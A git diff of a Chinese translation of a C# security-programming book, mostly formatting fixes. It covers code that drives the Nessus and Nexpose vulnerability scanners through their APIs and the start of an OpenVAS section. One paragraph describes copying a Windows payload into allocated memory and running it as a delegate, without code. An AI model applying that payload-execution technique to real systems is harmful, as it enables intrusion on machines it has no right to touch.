-我们还通过对 0x04（读）、0x02（写）和 0x01（执行）的值进行或运算来考虑内存模式，并将运算的结果存储在内存中。
+我们还通过对 `0x04`（读）、`0x02`（写）和 `0x01`（执行）的值进行或运算来考虑内存模式，并将运算的结果存储在内存中。
 
 ## 复制并执行负载
 
@@ -3727,47 +3758,57 @@ finally {
 
 列表 4-31 的最后几行显示了如何执行 Windows 负载（列表 4-26）。`Marshal.Copy()` 方法 ① 将我们的负载复制到分配的内存中，`Marshal.GetDelegateForPointer()` 方法 ② 将负载转换为一个委托。一旦我们调用它来执行代码。`try` 块后的 `finally` 块会在 `freeMe` 为 `true` 时释放内存 ③。
 
-
-
-
-
 # 5 自动化 NessUS
 
 ![](img/059a0f6a8101e80261ab133380da85bd_128_0.png)
 
 Nessus 是一种流行且强大的漏洞扫描器，它使用已知漏洞数据库来评估网络上的特定系统是否缺少补丁或是否容易受到已知漏洞的攻击。在本章中，我将向你如何编写类来与 Nessus API 交互，以实现自动化、配置和运行漏洞扫描。
 
-Nessus 最初作为一个开源漏洞扫描器开发的，但在 2005 年被 Tenable Network Security 收购后变为闭源。截至本文写作，Tenable 提供为期七天的 Nessus Professional 试版以及一个名为 Nessus Home 的限制版本。两者之间最大的区别是，Nessus Home 允许一次扫描 16 个 IP 地址，但 Home 版本已足够你运行本章中的示例并熟悉该程序了。Nessus 特别受到帮助扫描和管理其他公司网络的专业人士的欢迎。请遵循 Tenable 网站 https://www.tenable.com/products/nessus-home/ 上的说明来安装和配置 Nessus Home。
+Nessus 最初作为一个开源漏洞扫描器开发的，但在 2005 年被 Tenable Network Security 收购后变为闭源。截至本文写作，Tenable 提供为期七天的 Nessus Professional 试版以及一个名为 Nessus Home 的限制版本。两者之间最大的区别是，Nessus Home 允许一次扫描 16 个 IP 地址，但 Home 版本已足够你运行本章中的示例并熟悉该程序了。Nessus 特别受到帮助扫描和管理其他公司网络的专业人士的欢迎。请遵循 Tenable 网站 `https://www.tenable.com/products/nessus-home/` 上的说明来安装和配置 Nessus Home。
 
 许多组织需要定期的漏洞和补丁扫描来管理和识别其网络上的风险，并出于合规性目的。我们将通过构建类来帮助对网络上的主机执行未经身份验证的漏洞扫描，实现这些目标。
 
 ## REST 与 Nessus API
 
-Web 应用和 API 的出现带来了一种称为 REST API 的架构。REST（表述状态转移）是一种访问和与服务器上的资源（如用户账户或漏洞扫描）交互的方法，通常通过 HTTP 使用多种 HTTP 方法（GET, POST, DELETE 和 PUT）来实现。HTTP 方法描述了我们发起 HTTP 请求的意图（例如，我们是想创建资源还是修改资源？），类似于数据库中的 CRUD（增、删、改、查）操作。
+Web 应用和 API 的出现带来了一种称为 REST API 的架构。REST（表述状态转移）是一种访问和与服务器上的资源（如用户账户或漏洞扫描）交互的方法，通常通过 HTTP 使用多种 HTTP 方法（`GET`、`POST`、`DELETE` 和 `PUT`）来实现。HTTP 方法描述了我们发起 HTTP 请求的意图（例如，我们是想创建资源还是修改资源？），类似于数据库中的 CRUD（增、删、改、查）操作。
 
-例如，查看下面的 GET HTTP 请求示例，它类似于数据库的读取操作（如 SELECT * FROM users WHERE id = 1）：
+例如，查看下面的 `GET` HTTP 请求示例，它类似于数据库的读取操作（如 `SELECT * FROM users WHERE id = 1`）：
+
+```http
 GET /users/1 HTTP/1.0
+
 Host:192.168.0.1
+```
 
 在此示例中，我们正在请求 ID 为 1 的用户信息。要获取另一个用户 ID 的数据，你可以将 URI 末尾的 1 替换为该用户的 ID。
 
 要更新第一个用户的信息，HTTP 请求可能像这样：
+
+```http
 POST /users/1 HTTP/1.0
+
 Host:192.168.0.1
+
 Content-Type: application/json
+
 Content-Length: 24
 
 { "name": "Brandon Perry" }
+```
 
-在我们假设的 RESTful API 中，上述的 POST 请求将把第一个用户的名称更新为 Brandon Perry。通常，POST 请求用于更新 Web 服务器上的资源。
+在我们假设的 RESTful API 中，上述的 `POST` 请求将把第一个用户的名称更新为 Brandon Perry。通常，`POST` 请求用于更新 Web 服务器上的资源。
 
-要完全删除账户，使用 DELETE，如下所示：
+要完全删除账户，使用 `DELETE`，如下所示：
+
+```http
 DELETE /users/1 HTTP/1.0
+
 Host:192.168.0.1
+```
 
 Nessus API 的行为也类似。在消费 API 时，我们将像这些示例那样向服务器发送 JSON 并从服务器接收 JSON。我们在本章中编写的类旨在处理我们与 REST API 通信和交互的方式。
 
-一旦你安装了 Nessus，你可以在 https://<IP address>:8834/api 找到 Nessus REST API 文档。我们将仅涵盖驱动 Nessus 执行漏洞扫描的少数 API 调用。
+一旦你安装了 Nessus，你可以在 `https://<IP address>:8834/api` 找到 Nessus REST API 文档。我们将仅涵盖驱动 Nessus 执行漏洞扫描的少数 API 调用。
 
 ## NessusSession 类
 
@@ -3799,7 +3840,8 @@ public class NessusSession : IDisposable
     }
 }
 ```
-列表 5-1：NessusSession类的开头，显示了构造函数和 Authenticate 方法
+
+列表 5-1：NessusSession 类的开头，显示了构造函数和 `Authenticate` 方法
 
 如列表 5-1 所示，此类实现了 `IDisposable` 接口，以便我们在语句可以使用 `NessusSession` 类。正如你可能从前面的章节记得，`IDisposable` 接口允许我们通过调用 `Dispose()` 来自动清理与 Nessus 的会话，当语句中新实例类在垃圾回收期间被释放时，我们将很快实现该方法。
 
@@ -3849,7 +3891,8 @@ public JObject MakeRequest(string method, string uri, JObject data = null, strin
     return JObject.Parse(response);
 }
 ```
-列表 5-2：Nessus 类中的 MakeRequest 方法
+
+列表 5-2：Nessus 类中的 `MakeRequest` 方法
 
 ## 注销与清理
 
@@ -3863,8 +3906,6 @@ public void LogOut()
     }
 }
 ```
-
-
 
 ```cs
 }
@@ -3882,9 +3923,9 @@ public string Token { get; private set; }
 }
 ```
 
-Listing 5-3: NessusSession 类的最后两个方法，以及 Host、Authenticated 和 Token 属性
+列表 5-3：NessusSession 类的最后两个方法，以及 `Host`、`Authenticated` 和 `Token` 属性
 
-`LogOut()` 方法测试我们是否已通过 Nessus 服务器的身份验证。如果是，我们通过向 `MakeRequest()`  `DELETE` 作为 HTTP 方法、`/session` 作为 URI 以及身份验证令牌来调用 `MakeRequest()`，这将向 Nessus 服务器发送一个 `DELETE` HTTP 请求，从而有效地注销登录。一旦请求完成，我们将 `Authenticated` 属性设为 `false`。为了实现 `IDisposable` 接口，我们创建了 `Dispose()` 方法以便在已身份验证的情况下执行注销。
+`LogOut()` 方法测试我们是否已通过 Nessus 服务器的身份验证。如果是，我们通过向 `MakeRequest()` 传递 `DELETE` 作为 HTTP 方法、`/session` 作为 URI 以及身份验证令牌来调用 `MakeRequest()`，这将向 Nessus 服务器发送一个 `DELETE` HTTP 请求，从而有效地注销登录。一旦请求完成，我们将 `Authenticated` 属性设为 `false`。为了实现 `IDisposable` 接口，我们创建了 `Dispose()` 方法以便在已身份验证的情况下执行注销。
 
 # 测试 NessusSession 类
 
@@ -3898,27 +3939,30 @@ public static void Main(string[] args)
 }
 ```
 
-Listing 5-4: 测试 NessusSession 以通过 NessusManager 进行身份验证
+列表 5-4：测试 NessusSession 以通过 NessusManager 进行身份验证
 
 在 `Main()` 方法中，我们创建了一个新的 `NessusSession`，并将 Nessus 宿机的 IP 地址、用户名和 Nessus 密码作为参数传递。通过已验证的会话，我们打印 Nessus 在成功验证后提供的身份验证令牌，然后退出。
 
 > 注意
-NessusSession是在 `using` 语句的上下文中创建的因此我们在 `NessusSession` 类中实现的 `Dispose()` 方法将在 `using` 块结束时自动调用。这会注销 `NessusSession`，使我们从 Nessus 获得的身份验证令牌失效。
+
+NessusSession 是在 `using` 语句的上下文中创建的，因此我们在 `NessusSession` 类中实现的 `Dispose()` 方法将在 `using` 块结束时自动调用。这会注销 `NessusSession`，使我们从 Nessus 获得的身份验证令牌失效。
 
 运行此代码应该打印出一个与列表 5-5 类似的身份验证令牌。
 
-## Listing 5-5
+## 列表 5-5
 
 ```bash
 $ mono /ch5_automating_nessus.exe
 Your authentication token is: 19daad2f2ca99b2a2d48febb242496a99727c19252966a$
 ```
 
-Listing 5-5: 运行 NessusSession 测试代码以打印身份验证
+列表 5-5：运行 NessusSession 测试代码以打印身份验证
 
-## ## NessusManager 类
+## NessusManager 类
 
-Listing 5-6 显示了我们需要在 `NessusManager` 类中实现的方法，该类将把 Nessus 的常用 API 调用和功能封装在易于使用的方法中供我们以后调用。
+
+
+Listing 5-6 显示了我们需要在`NessusManager`类中实现的方法，该类将把 Nessus 的常用 API 调用和功能封装在易于使用的方法中供我们以后调用。
 
 ```cs
 public class NessusManager : IDisposable
@@ -3961,17 +4005,13 @@ public class NessusManager : IDisposable
 }
 ```
 
-Listing 5-6: NessusManager 类实现 Disposable
+Listing 5-6: `NessusManager`类实现`Disposable`
 
-`NessusManager` 类实现了 `IDisposable`，以便我们可以使用 `NessusSession` 与 Nessus API 交互，并在必要时自动注销。`NessusManager` 构造函数接收一个参数 `NessusSession`，并将其赋值给私有变量 `_session`，`NessusManager` 中的方法均可以访问该变量。
+`NessusManager`类实现了`IDisposable`，以便我们可以使用`NessusSession`与 Nessus API 交互，并在必要时自动注销。`NessusManager`构造函数接收一个参数`NessusSession`，并将其赋值给私有变量`_session`，`NessusManager`中的方法均可以访问该变量。
 
-Nessus 预配置了几个不同的扫描策略。我们将使用 `GetScanPolicies()` 筛选这些策略，并通过 `MakeRequest()` 从 `/editor/policy/templates/` URI 获取策略列表及其 ID。`CreateScan` 的第一个参数是扫描 ID，第二个参数是要扫描的 CIDR 范围。你也可以在此参数中传递一个由换行符分隔的 IP 地址字符串。第三和第四个参数分别用于扫描的名称和描述。我们将为每个扫描名称使用唯一的 `Guid`（全局唯一 ID，字母和数字字符串），这仅用于测试目的，但当你构建更复杂的系统时，你可能可能想要采用一套扫描命名系统以便于跟踪。我们使用传递给 `CreateScan()` 的参数来创建一个包含扫描创建设置的新 `Object`。然后我们将此 `Object` 传递给 `MakeRequest()`，它将向 `/scans` URI 发送 `POST` 请求并返回有关扫描的所有相关信息，证明我们成功创建了（但尚未启动！）一个扫描。我们使用扫描 ID 来报告扫描状态。
+Nessus 预配置了几个不同的扫描策略。我们将使用`GetScanPolicies()`筛选这些策略，并通过`MakeRequest()`从`/editor/policy/templates/` URI 获取策略列表及其 ID。`CreateScan`的第一个参数是扫描 ID，第二个参数是要扫描的 CIDR 范围。你也可以在此参数中传递一个由换行符分隔的 IP 地址字符串。第三和第四个参数分别用于扫描的名称和描述。我们将为每个扫描名称使用唯一的`Guid`（全局唯一 ID，字母和数字字符串），这仅用于测试目的，但当你构建更复杂的系统时，你可能可能想要采用一套扫描命名系统以便于跟踪。我们使用传递给`CreateScan()`的参数来创建一个包含扫描创建设置的新`Object`。然后我们将此`Object`传递给`MakeRequest()`，它将向`/scans` URI 发送`POST`请求并返回有关扫描的所有相关信息，证明我们成功创建了（但尚未启动！）一个扫描。我们使用扫描 ID 来报告扫描状态。
 
-一旦我们通过 `CreateScan()` 创建了扫描，我们将其 ID 传递给 `StartScan()`，它将向 `/scans/<scanID>/launch` URI 发送 `POST` 请求并返回是否启动。我们使用 `GetScan()` 来监控扫描。为了完成 `NessusManager`，我们实现了 `Dispose()` 通过将 `_session` 设为 `null` 来注销。
-
-
-
-
+一旦我们通过`CreateScan()`创建了扫描，我们将其 ID 传递给`StartScan()`，它将向`/scans/<scanID>/launch` URI 发送`POST`请求并返回是否启动。我们使用`GetScan()`来监控扫描。为了完成`NessusManager`，我们实现了`Dispose()`通过将`_session`设为`null`来注销。
 
 ```json
 "plugin_family": "General"
@@ -3982,11 +4022,12 @@ Nessus 预配置了几个不同的扫描策略。我们将使用 `GetScanPolicie
 
 ## 结论
 
-本章向你展示了如何自动化 Nessus API 的各个方面，以完成对网络连接设备的非身份验证扫描。为了实现这一目标，我们需要能够向 Nessus HTTP 服务器发送 API 请求。为此，我们创建了 `NessusSession` 类；一旦我们能够通过 Nessus 身份验证，我们又创建了 `NessusManager` 类来创建、运行和报告扫描结果。我们使用使用这些类的代码封装了所有内容，根据用户提供的信息自动驱动 Nessus API。
+本章向你展示了如何自动化 Nessus API 的各个方面，以完成对网络连接设备的非身份验证扫描。为了实现这一目标，我们需要能够向 Nessus HTTP 服务器发送 API 请求。为此，我们创建了`NessusSession`类；一旦我们能够通过 Nessus 身份验证，我们又创建了`NessusManager`类来创建、运行和报告扫描结果。我们使用使用这些类的代码封装了所有内容，根据用户提供的信息自动驱动 Nessus API。
 
 这并不是 Nessus 提供的功能的全部范围，你可以在 Nessus API 文档中找到更多细节。许多组织要求对网络上的主机进行身份验证扫描，以获取完整的补丁列表来确定主机健康状况，将你的自动化程序升级以处理这种情况将是一个很好的练习。
 
 # 6
+
 # 自动化 NEXPOSE
 
 ![](img/059a0f6a8101e80261ab133380da85bd_139_0.png)
@@ -4004,6 +4045,7 @@ $ wget http://download2.rapid7.com/download/Nexpose-v4/NexposeSetup-Linux64.bin
 $ chmod +x ./NexposeSetup-Linux64.bin
 $ sudo ./NexposeSetup-Linux64.bin
 ```
+
 6-1: 下载并安装 Nexpose
 
 当在图形桌面环境（如 KDE 或 GNOME）中运行安装程序时，会向用户呈现图形化安装程序以逐步完成初始配置，如图 6-1 所示。如果你通过文本环境（如 SSH）安装 Nexpose，安装程序将通过是/否问题和其他信息提示来逐步完成该配置。
@@ -4012,7 +4054,7 @@ $ sudo ./NexposeSetup-Linux64.bin
 
 图 6-1: 图形 Nexpose 安装程序
 
-一旦安装了 Nexpose，在终端中运行 `ifconfig` 以查看在浏览器中打开的 IP 地址。然后在浏览器中输入 `https://ip:3780/`，将 ip 替换为运行 Nexpose 的机器的地址。你应该看到 Nexpose 登录页面，如图 6-2 所示。
+一旦安装了 Nexpose，在终端中运行`ifconfig`以查看在浏览器中打开的 IP 地址。然后在浏览器中输入`https://ip:3780/`，将 ip 替换为运行 Nexpose 的机器的地址。你应该看到 Nexpose 登录页面，如图 6-2 所示。
 
 ![](img/059a0f6a8101e80261ab133380da85bd_141_0.png)
 
@@ -4033,6 +4075,7 @@ $ sudo ./NexposeSetup-Linux64.bin
 ```bash
 curl -k -d "username=admin&password=password" -H "Content-Type: text/xml" -X POST https://ip:3780/api/login
 ```
+
 列表 6-2: 使用 Nexpose API 进行身份验证
 
 ## Nexpose 术
@@ -4043,7 +4086,7 @@ curl -k -d "username=admin&password=password" -H "Content-Type: text/xml" -X POS
 
 ## NexposeSession 类
 
-我们将从编写与 Nexpose API 通信的 `NexposeSession` 类开始，如 6-3 所示。
+我们将从编写与 Nexpose API 通信的`NexposeSession`类开始，如 6-3 所示。
 
 ```csharp
 public class NexposeSession:IDisposable
@@ -4068,12 +4111,9 @@ public string SessionID { get; set; }
 public NexposeAPIVersion APIVersion { get; set; }
 ```
 
-列表 6-3: 带有构造函数和属性的 NexposeSession 类开头
+列表 6-3: 带有构造函数和属性的`NexposeSession`类开头
 
-
-
-
-默认。（否则，SSL 证书验证将在 HTTP 请求期间失败）。在 ⑥ 处，我们尝试通过调用 `Authenticate()` 方法进行身份验证，该方法的展开见列表 6-4。
+默认。（否则，SSL 证书验证将在 HTTP 请求期间失败）。在 ⑥ 处，我们尝试通过调用`Authenticate()`方法进行身份验证，该方法的展开见列表 6-4。
 
 ```csharp
 public XDocument Authenticate(string username, string password)
@@ -4093,15 +4133,15 @@ public XDocument Authenticate(string username, string password)
 }
 ```
 
-列表 6-4：Nexpose 类的 Authenticate 方法接收用户名和密码作为参数。
+列表 6-4：`Nexpose`类的`Authenticate`方法接收用户名和密码作为参数。
 
-`Authenticate()` 方法 ① 接收用户名和密码作为参数。为了将用户名和密码发送到 API 进行身份验证，我们在 ② 处创建一个 `XDocument`，根节点为 `LoginRequest`，并带有 `user-id` 和 `password` 属性。我们将 `XDocument` 传递给 `ExecuteCommand()` 方法 ⓷，然后存储由 Nexpose 服务器返回的结果。
+`Authenticate()`方法 ① 接收用户名和密码作为参数。为了将用户名和密码发送到 API 进行身份验证，我们在 ② 处创建一个`XDocument`，根节点为`LoginRequest`，并带有`user-id`和`password`属性。我们将`XDocument`传递给`ExecuteCommand()`方法 ⓷，然后存储由 Nexpose 服务器返回的结果。
 
-在 ④ 处，我们判断 Nexpose 的 XML 响应的成功值是否为 1。如果是，在 ⑤ 处，我们将 `SessionID` 属性赋值为响应中的 `session-id`，并将 `IsAuthenticated` 设置为 `true`。最后，我们返回 XML 响应 ⑥。
+在 ④ 处，我们判断 Nexpose 的 XML 响应的成功值是否为 1。如果是，在 ⑤ 处，我们将`SessionID`属性赋值为响应中的`session-id`，并将`IsAuthenticated`设置为`true`。最后，我们返回 XML 响应 ⑥。
 
 ## ExecuteCommand() 方法
 
-列表 6-5 所示的 `ExecuteCommand()` 方法是 NexposeSession 类的核心。
+列表 6-5 所示的`ExecuteCommand()`方法是`NexposeSession`类的核心。
 
 ```csharp
 public object ExecuteCommand(XDocument commandXml)
@@ -4121,9 +4161,9 @@ public object ExecuteCommand(XDocument commandXml)
 }
 ```
 
-列表 6-5：NexposeSession 类的 ExecuteCommand 方法的开头
+列表 6-5：`NexposeSession`类的`ExecuteCommand`方法的开头
 
-在向 Nexpose 发送数据之前，我们需要知道要使用哪个版本的 API，因此在 ① 处使用 `switch/case` 块（类似于一系列语句）来测试 `APIVersion` 的值。例如，`NexposeAPIVersion.v11` 或 `NexposeAPIVersion.v12` 的值将告诉我们需要使用版本 1.1 或 1.2 的 API URI。
+在向 Nexpose 发送数据之前，我们需要知道要使用哪个版本的 API，因此在 ① 处使用`switch/case`块（类似于一系列语句）来测试`APIVersion`的值。例如，`NexposeAPIVersion.v11`或`NexposeAPIVersion.v12`的值将告诉我们需要使用版本 1.1 或 1.2 的 API URI。
 
 ## 向 Nexpose API 发起 HTTP 请求
 
@@ -4138,6 +4178,8 @@ request.ContentLength = byteArray.Length;
 using (Stream dataStream = request.GetStream())
     dataStream.Write(byteArray, 0, byteArray.Length); // 列表 6-6：在 ExecuteCommand() 通过 HTTP 向 Nexpose 发送 XML 命令
 ```
+
+
 
 谈论 Nexpose 的 API 请求包含两个部分。首先，Nexpose 使用 XML 发起 API 请求，然后读取带有 API 请求结果的响应。为了向 Nexpose API 发起实际 HTTP 请求，我们创建一个 `HttpWebRequest` ① 并将其 `Method` 属性设置为 `POST` ②，将 `ContentType` 属性设置为 `text/xml` ③，并将 `ContentLength` 属性设置为 XML 的长度。接下来，我们将 XML 命令字节写入 HTTP 请求流，并通过 `Write(results)` 将流发送到 Nexpose 处。Nexpose 将解析 XML，确定执行的操作，并返回响应中的结果。
 
@@ -4159,16 +4201,13 @@ request.ContentType = "text/xml"; // 列表 6-7：为 TLS 设置代理
 
 接下来，我们需要读取刚刚生成的 Nexpose API 的 HTTP 响应。列表 6-8 显示了我们如何完成 `ExecuteCommand()` 方法。
 
-
-
-
-在 ① 尝试通过将 Nexpose 服务器的用户名、密码和 IP 地址传递给新的 NexposeSession 来进行身份验证。如果身份验证成功，我们将在屏幕上显示分配给会话的 SessionID。如果身份验证失败，我们将抛出一个消息为“Authentication failed.”的异常。
+在 ① 尝试通过将 Nexpose 服务器的用户名、密码和 IP 地址传递给新的 `NexposeSession` 来进行身份验证。如果身份验证成功，我们将在屏幕上显示分配给会话的 `SessionID`。如果身份验证失败，我们将抛出一个消息为“Authentication failed.”的异常。
 
 ## NexposeManager 类
 
 列表 6-12 所示的 `NexposeManager` 类允许我们创建、监控并报告扫描结果。我们从一个简单的 API 调用开始。
 
-```c
+```csharp
 class NexposeManager : IDisposable
 {
     private readonly NexposeSession _session;
@@ -4194,7 +4233,7 @@ class NexposeManager : IDisposable
 }
 ```
 
-> 列表 6-12：带有 IDisposable 的 `GetSystemInformation()` 的 NexposeManager 类，我们编写了一个 `Dispose()` 方法
+> 列表 6-12：带有 `IDisposable` 的 `GetSystemInformation()` 的 `NexposeManager` 类，我们编写了一个 `Dispose()` 方法
 
 因为 `NexposeManager` 通过声明会话持有 `NexposeManager` 将消耗的 `NexposeSession` 类而实现了 `Disposable` ③，并且我们将 `NexposeSession` ② 作为唯一参数传入。如果 Nexpose 会话通过了身份验证 ③，我们将 `_session` 赋值给会话。如果不是，我们将抛出一个异常 ④。
 
@@ -4211,7 +4250,8 @@ using (NexposeManager manager = new NexposeManager(session))
 }
 ```
 
-列表 6-13：在 Main 方法中使用 `NexposeManager` 类
+列表 6-13：在 `Main` 方法中使用 `NexposeManager` 类
+
 我们将 `NexposeSession` 类传递到 `NexposeManager` 构造函数 ①，然后调用 `GetSystemInformation()` ② 来打印系统信息，如图 6-4 所示。
 
 ![](img/059a0f6a8101e80261ab133380da85bd_150_0.png)
@@ -4222,7 +4262,7 @@ using (NexposeManager manager = new NexposeManager(session))
 
 在本节中，我们最后将查看如何使用 Nexpose 自动化漏洞扫描。我们创建一个 Nexpose 站点（site），扫描该站点，然后下载包含发现结果的报告。我们将仅浅接触 Nexpose 强大扫描功能的皮毛。
 
-## 创建带有资产的站点
+### 创建带有资产的站点
 
 在用 Nexpose 启动站点之前，我们需要创建一个待扫描的站点。列表 6-14 显示了我们如何在 `CreateOrUpdateSite()` 方法中构建创建站点的 XML API 请求。
 
@@ -4261,10 +4301,12 @@ string[][] ips = null, int siteID = -1;
 ```
 
 列表 6-14：NexposeManager 类中的 `CreateOrUpdateSite()` 方法
-`CreateOrUpdateSite()` 方法接受多四个参数：人类可读的站点名称、主机名和 IP 范围。在此所示，将 -1 作为 site ID 将创建一个新站点。我们创建了一个 XML 元素 `hosts`，如果主机名不为空，则将其添加到 `Hosts`。我们对作为参数传递的任何 IP 范围执行相同的操作。
+
+`CreateOrUpdateSite()` 方法接受多四个参数：人类可读的站点名称、主机名和 IP 范围。在此所示，将 `-1` 作为 `siteID` 将创建一个新站点。我们创建了一个 XML 元素 `hosts`，如果主机名不为空，则将其添加到 `Hosts`。我们对作为参数传递的任何 IP 范围执行相同的操作。
+
 接下来，我们创建一个带有根节点 `SiteSaveRequest` 和 `session-id` 属性的 `XDocument`，以告诉 Nexpose 服务器我们已通过身份验证并可以进行此 API 调用。在根节点内部，我们创建了一个 `XElement Site` 来存储新站点的特定信息和扫描配置详情，例如要扫描的主机和扫描模板 ID。我们将 `SiteSaveRequest` 传递给 `ExecuteCommand()`，并将 `ExecuteCommand()` 返回的对象强制转换为该类型。
 
-## 开始扫描
+### 开始扫描
 
 列表 6-15 显示了如何通过 `ScanSite()` 和 `GetStatus()` 方法开始扫描并获取状态。由于 `NexposeSession` 类处理了所有通信，你只需要设置好 API 请求。
 
@@ -4288,10 +4330,11 @@ public XDocument GetStatus(int scanID)
 }
 ```
 
->列表 6-15：NexposeManager 类中的 `ScanSite()` 和 `GetStatus()` 方法
-`ScanSite()` 方法 ① 接受 siteID ②。我们创建一个带有 `ScanRequest` 的 `XDocument` ③，然后添加 `session-id` 和 `site-id` 属性。接下来，我们发送 `ScanRequest` ④。`GetStatus()` 方法 ⑤ 接受一个参数，即扫描 ID ⑥，这是通过创建一个新的 `XDocument` 获取的。
+> 列表 6-15：NexposeManager 类中的 `ScanSite()` 和 `GetStatus()` 方法
 
-## 创建 PDF 报告并删除站点
+`ScanSite()` 方法 ① 接受 `siteID` ②。我们创建一个带有 `ScanRequest` 的 `XDocument` ③，然后添加 `session-id` 和 `site-id` 属性。接下来，我们发送 `ScanRequest` ④。`GetStatus()` 方法 ⑤ 接受一个参数，即扫描 ID ⑥，这是通过创建一个新的 `XDocument` 获取的。
+
+### 创建 PDF 报告并删除站点
 
 列表 6-16 显示了我们如何使用 API 创建报告并删除站点。
 
@@ -4318,8 +4361,9 @@ public XDocument DeleteSite(int siteID)
 }
 ```
 
->列表 6-16：NexposeManager 类中的 `GetPdf` 和 `DeleteSite(site)` 方法
-这两个方法均接受一个参数，为了生成 PDF 报告，我们使用 `AdhocGenerateRequest` ① 并指定 pdf ② 和 siteID ⓷。我们将 `ExecuteCommand()` 返回的对象转换为而不是 `XDocument` ④，因为 Nexpose 将返回一个混合类型的 HTTP 响应。我们将 PDF 的原始字节返回给调用方法。
+> 列表 6-16：NexposeManager 类中的 `GetPdf` 和 `DeleteSite(site)` 方法
+
+这两个方法均接受一个参数。为了生成 PDF 报告，我们使用 `AdhocGenerateRequest` ① 并指定 `pdf` ② 和 `siteID` ③。我们将 `ExecuteCommand()` 返回的对象转换为而不是 `XDocument` ④，因为 Nexpose 将返回一个混合类型的 HTTP 响应。我们将 PDF 的原始字节返回给调用方法。
 
 ## 整合
 
@@ -4339,9 +4383,6 @@ public static void Main(string[] args)
 ```
 
 > 列表 6-17：创建临时站点并获取站点 ID
-
-
-
 
 在创建 `NexposeSession` 1 和 `NexposeManager` 2 对象后，我们将待扫描的 IP 地址列表作为字符串 3 传入，并包含起始地址和结束地址。若要扫描单个 IP，请使用空字符串作为第二个元素，如 4 所示。我们将目标 IP 列表传递给 `CreateOrUpdateSite()` 5，并传入一个 `Guid` 6 作为临时站点的名称。（我们只需要为站点名称提供一个唯一的字符串即可。）当我们收到来自 Nexpose 的用于创建临时站点的 HTTP 响应时，我们从 XML 中提取出站点 ID 并将其存储。
 
@@ -4363,9 +4404,11 @@ while (status.Root.Attribute("status").Value != "finished"){
 }
 ```
 
-列表 6-18：启动并监控 Nexpose 扫描
 
-我们通过将站点 ID 传递给 `ScanSite()` 1 开始扫描，然后从响应中获取扫描 ID 并将其传递给 `GetScanStatus()` 2。接下来，在 `while` 循环中，只要扫描状态不是完成 3，我们就会睡眠几秒钟。然后我们再次检查状态并使用 `WriteLine()` 4 向用户显示状态消息。
+
+# 列表 6-18：启动并监控 Nexpose 扫描
+
+我们通过将站点 ID 传递给`ScanSite()`①开始扫描，然后从响应中获取扫描 ID 并将其传递给`GetScanStatus()`②。接下来，在`while`循环中，只要扫描状态不是完成③，我们就会睡眠几秒钟。然后我们再次检查状态并使用`WriteLine()`④向用户显示状态消息。
 
 ## 生成报告并删除站点
 
@@ -4382,7 +4425,7 @@ manager.DeleteSite(siteID);
 
 列表 6-19：检索 Nexpose 站点报告、写入文件系统并删除站点
 
-要生成报告，我们将站点 ID 传递给 ①，它会返回一个字节数组。然后我们使用 `WriteAllBytes` ③ 将 PDF 报告保存到用户的桌面目录，使用站点的 ID ② 作为文件名并添加 .pdf 扩展名。最后，我们使用 `DeleteSite` ⒴ 删除站点。
+要生成报告，我们将站点 ID 传递给①，它会返回一个字节数组。然后我们使用`WriteAllBytes`③将 PDF 报告保存到用户的桌面目录，使用站点的 ID②作为文件名并添加`.pdf`扩展名。最后，我们使用`DeleteSite`④删除站点。
 
 ## 运行自动化
 
@@ -4397,28 +4440,33 @@ C:\Users\example\Documents\ch6\bin\Debug\06_automating_nexpose.exe
 11:47:15 PM: <ScanStatus success="1" scan-id="4" engine-id="3" status="finished" />
 ```
 
+```
 C:\Users\example\Documents\ch6\bin\Debug\dir Users\example\Nexpose\*.*
+
 Volume in drive C
+
 Volume Serial Number is 5619-09A2
 
 Directory of C:\Users\example
 
 07/30/2019 11:47 PM 103,174 4.pdf  privately
+
 09/09/2019 09:05:52 PM 17,152,368 Automate The Boring Stuff with Python.pdf
+
 2 File(s) 17,255,542 bytes
+
 0 Dir(s) 362,552,098,816 bytes
+```
 
 列表 6-20：运行并将并将写入用户桌面
 
-注意列表 6-20 的输出，Nexpose 返回了至少三种扫描状态，这些是扫描的不同阶段：运行 ①、集成 ② 和完成 ③。一旦扫描完成，PDF 报告将写入用户的桌面 ⒴，正如你预期的那样。人们可以使用最喜欢的 PDF 阅读器打开此新报告，查看 Nexpose 发现了哪些漏洞。
+注意列表 6-20 的输出，Nexpose 返回了至少三种扫描状态，这些是扫描的不同阶段：运行①、集成②和完成③。一旦扫描完成，PDF 报告将写入用户的桌面④，正如你预期的那样。人们可以使用最喜欢的 PDF 阅读器打开此新报告，查看 Nexpose 发现了哪些漏洞。
 
 ## 总结
 
-在本章中，你学习了如何驱动漏洞扫描器 Nexpose 来报告网络客主机的漏洞。你还学习了 Nexpose 如何存储网络上计算机的信息，例如站点和资产。你构建了一些类来使用基础 C# 库编程驱动 Nexpose，并学习了如何使用 `NexposeSession` 对 Nexpose 进行身份验证以及向 Nexpose API 发送和接收 XML。你还看到了 `NexposeManager` 类封装了 API 功能，包括创建和删除站点的功能。最后，你能够驱动 Nexpose 扫描网络资产，然后创建一个显示结果的美化 PDF 报告。
+在本章中，你学习了如何驱动漏洞扫描器 Nexpose 来报告网络客主机的漏洞。你还学习了 Nexpose 如何存储网络上计算机的信息，例如站点和资产。你构建了一些类来使用基础 C# 库编程驱动 Nexpose，并学习了如何使用`NexposeSession`对 Nexpose 进行身份验证以及向 Nexpose API 发送和接收 XML。你还看到了`NexposeManager`类封装了 API 功能，包括创建和删除站点的功能。最后，你能够驱动 Nexpose 扫描网络资产，然后创建一个显示结果的美化 PDF 报告。
 
 Nexpose 的功能远超简单的漏洞管理。扩展你的库以涵盖这些高级功能应该是相对容易的，而且确实如此。
-
-
 
 ```csharp
 public SslStream
@@ -4435,17 +4483,17 @@ public SslStream
 }
 ```
 
-Listing 7-3: OpenVASSession 类的构造函数和属性
+Listing 7-3: OpenVASSession 的构造函数和属性
 
-OpenVASSession 构造函数接受四个参数：用于 OpenVAS 身份验证的用户名和密码（在虚拟设备中默认为 admin:admin）；要连接的主机；以及可选的连接到主机的端口，其中 port 参数将传递给 IPAddress.Parse()。
+OpenVASSession 构造函数接受四个参数：用于 OpenVAS 身份验证的用户名和密码（在虚拟设备中默认为`admin:admin`）；要连接的主机；以及可选的连接到主机的端口，其中`port`参数将传递给`IPAddress.Parse()`。
 
-我们将 host 参数传递给 IPAddress.Parse()，并将结果赋值给 ServerPort 属性。如果身份验证成功（如下一节所述），则将用户名和密码传递给 Authenticate() 方法。ServerIPAddress 和 ServerPort 属性在构造函数中赋值，并在整个类中。。
